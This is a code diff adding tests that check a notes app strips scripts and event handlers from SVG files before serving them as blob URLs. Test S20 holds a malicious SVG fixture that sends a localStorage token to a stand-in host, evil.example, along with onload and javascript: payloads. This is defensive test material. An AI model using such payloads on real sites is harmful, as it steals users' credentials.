@@ -17,6 +17,9 @@ vi.mock('../api/media', () => ({
 }))
 
 const { createPreviewMediaResolver } = await import('./media-resolve')
+// svg sanitize（S20〜S22）が動的 import する dompurify を事前ロードしておく
+// （初回ロードが flush 1 回のマイクロタスク排出に収まることを保証する）
+await import('dompurify')
 
 import type { Settings } from '../types'
 // 型のみの import はモックに影響しない（実行時には消える）
@@ -36,6 +39,7 @@ vi.stubGlobal(
 
 const MEDIA_BASE = 'https://raw.githubusercontent.com/kako-jun/notes-media/main'
 const PNG_URL = `${MEDIA_BASE}/20260710-abcd1234-photo.png`
+const SVG_URL = `${MEDIA_BASE}/20260710-abcd1234-figure.svg`
 const MP4_URL = `${MEDIA_BASE}/20260710-abcd1234-clip.mp4`
 const MP3_URL = `${MEDIA_BASE}/20260710-abcd1234-voice.mp3`
 const ZIP_URL = `${MEDIA_BASE}/20260710-abcd1234-bundle.zip`
@@ -46,6 +50,16 @@ const translate = (key: string) => `t:${key}`
 
 function okResult(): MediaFetchResult {
   return { ok: true, data: new ArrayBuffer(8) }
+}
+
+function textResult(text: string): MediaFetchResult {
+  return { ok: true, data: new TextEncoder().encode(text).buffer as ArrayBuffer }
+}
+
+/** createObjectURL に渡された n 番目の Blob の中身をテキストで読む */
+async function createdBlobText(callIndex = 0): Promise<string> {
+  const blob = createObjectURLMock.mock.calls[callIndex][0] as Blob
+  return await blob.text()
 }
 
 function failResult(): MediaFetchResult {
@@ -227,6 +241,61 @@ describe('apply: 対象検出と差し替え', () => {
     for (const img of Array.from(imgs)) {
       expect(img.getAttribute('src')).toBe('blob:agasteer/1')
     }
+  })
+})
+
+describe('apply: SVG の sanitize（blob オリジン継承対策）', () => {
+  // blob: URL はアプリオリジンを継承するため、悪意 SVG を「新しいタブで開く」と
+  // ドキュメントとして script が実行され localStorage の PAT に届く。
+  // Blob 化前に中身から活性コンテンツが除去されていることを検証する
+  it('S20: script・イベントハンドラ入りの悪意 SVG は除去されて Blob 化される', async () => {
+    resolveMediaMock.mockResolvedValue(
+      textResult(
+        '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">' +
+          '<script>fetch("https://evil.example/?" + localStorage.getItem("agasteer"))</script>' +
+          '<a href="javascript:alert(2)"><rect width="10" height="10" /></a>' +
+          '</svg>'
+      )
+    )
+    const container = renderContainer(`<img src="${SVG_URL}" alt="figure">`)
+    const resolver = createPreviewMediaResolver()
+    resolver.apply(container, settings, translate)
+    await flush()
+    expect(container.querySelector('img')?.getAttribute('src')).toBe('blob:agasteer/1')
+    const blobText = await createdBlobText()
+    expect(blobText).not.toContain('<script')
+    expect(blobText).not.toContain('onload')
+    expect(blobText).not.toContain('javascript:')
+    // 図形自体は生き残る（正当な SVG の表示を殺さない）
+    expect(blobText).toContain('<svg')
+    expect(blobText).toContain('<rect')
+  })
+
+  it('S21: 正当な SVG は図形を保持したまま Blob 化される', async () => {
+    resolveMediaMock.mockResolvedValue(
+      textResult(
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">' +
+          '<rect width="10" height="10" fill="#c7a443" /><circle cx="15" cy="15" r="4" />' +
+          '</svg>'
+      )
+    )
+    const container = renderContainer(`<img src="${SVG_URL}" alt="figure">`)
+    const resolver = createPreviewMediaResolver()
+    resolver.apply(container, settings, translate)
+    await flush()
+    const blobText = await createdBlobText()
+    expect(blobText).toContain('<rect')
+    expect(blobText).toContain('<circle')
+    expect(blobText).toContain('viewBox="0 0 20 20"')
+  })
+
+  it('S22: svg 以外（zip）は中身を変更せずそのまま Blob 化される', async () => {
+    resolveMediaMock.mockResolvedValue(textResult('<svg>zipの中身がたまたまSVG風でも素通し</svg>'))
+    const container = renderContainer(`<a href="${ZIP_URL}">zip</a>`)
+    const resolver = createPreviewMediaResolver()
+    resolver.apply(container, settings, translate)
+    await flush()
+    expect(await createdBlobText()).toBe('<svg>zipの中身がたまたまSVG風でも素通し</svg>')
   })
 })
 
